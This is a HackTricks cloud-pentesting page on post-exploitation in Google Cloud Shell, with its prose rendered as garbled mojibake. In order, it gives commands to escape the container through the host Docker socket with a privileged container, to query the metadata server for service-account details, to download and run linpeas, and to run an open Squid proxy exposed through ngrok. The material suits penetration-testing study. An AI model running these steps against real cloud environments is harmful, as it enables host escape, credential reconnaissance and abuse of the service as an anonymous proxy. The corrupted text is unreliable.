# GCP - Cloud Shell Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud Shell

Cloud Shell рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Container Escape

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Google Cloud Shell рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЖрдк **рдЖрд╕рд╛рдиреА рд╕реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдРрд╕рд╛ рдХрд░рдХреЗ:

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
{% endcode %}

рдпрд╣ рдЧреВрдЧрд▓ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдкрдХреЛ рдЙрд╕ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╣реЛ рд░рд╣реА рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдПрдХ рд╡реНрдпрд╛рдкрдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рджреЗрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣реЛрд╕реНрдЯ рд╕реЗ рдЖрдк рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
{% endcode %}

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреЛрдк рдХреЗ рд╕рд╛рде:

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
{% endcode %}

LinPEAS рдХреЗ рд╕рд╛рде рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ:

{% code overflow="wrap" %}
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
{% endcode %}

[https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf_my_gcp_permissions) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж **рдХреЛрдИ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд┐рд▓реА**...

### рдЗрд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЧреВрдЧрд▓ рдХреНрд▓рд╛рдЙрдб рд╢реЗрд▓ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдпрд╛ рдЙрдиреНрд╣реЗрдВ .bashrc рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбрд╛рд▓реЗрдВ):
```bash
sudo apt install -y squid
```
рдмрд╕ рдЖрдкрдХреЛ рдмрддрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ Squid рдПрдХ http рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рд╣реИред рдПрдХ **squid.conf** рдлрд╝рд╛рдЗрд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде рдмрдирд╛рдПрдВ:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
**squid.conf** рдлрд╝рд╛рдЗрд▓ рдХреЛ **/etc/squid** рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ
```bash
sudo cp squid.conf /etc/squid
```
рдЕрдВрдд рдореЗрдВ рд╕реНрдХреНрд╡рд┐рдб рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдПрдБ:
```bash
sudo service squid start
```
ngrok рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдкреНрд░реЙрдХреНрд╕реА рдмрд╛рд╣рд░ рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛ рд╕рдХреЗ:
```bash
./ngrok tcp 3128
```
tcp:// рдпреВрдЖрд░рдПрд▓ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЪрд▓рд╛рдПрдБред рдпрджрд┐ рдЖрдк рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ tcp:// рднрд╛рдЧ рдФрд░ рдкреЛрд░реНрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрдирд╛ рдФрд░ рдЕрдкрдиреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рдкреЛрд░реНрдЯ рдлрд╝реАрд▓реНрдб рдореЗрдВ рдкреЛрд░реНрдЯ рдбрд╛рд▓рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИ (squid рдПрдХ http рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рд╣реИ)ред

рд╢реБрд░реБрдЖрдд рдореЗрдВ рдмреЗрд╣рддрд░ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП .bashrc рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпрд╛рдБ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
The instructions were copied from [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). рдЙрд╕ рдкреГрд╖реНрда рдкрд░ Cloud Shell рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░чЪДш╜пф╗╢ (рдбреЗрдЯрд╛рдмреЗрд╕ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡рд┐рдВрдбреЛрдЬ) рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдкрд╛рдЧрд▓ рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
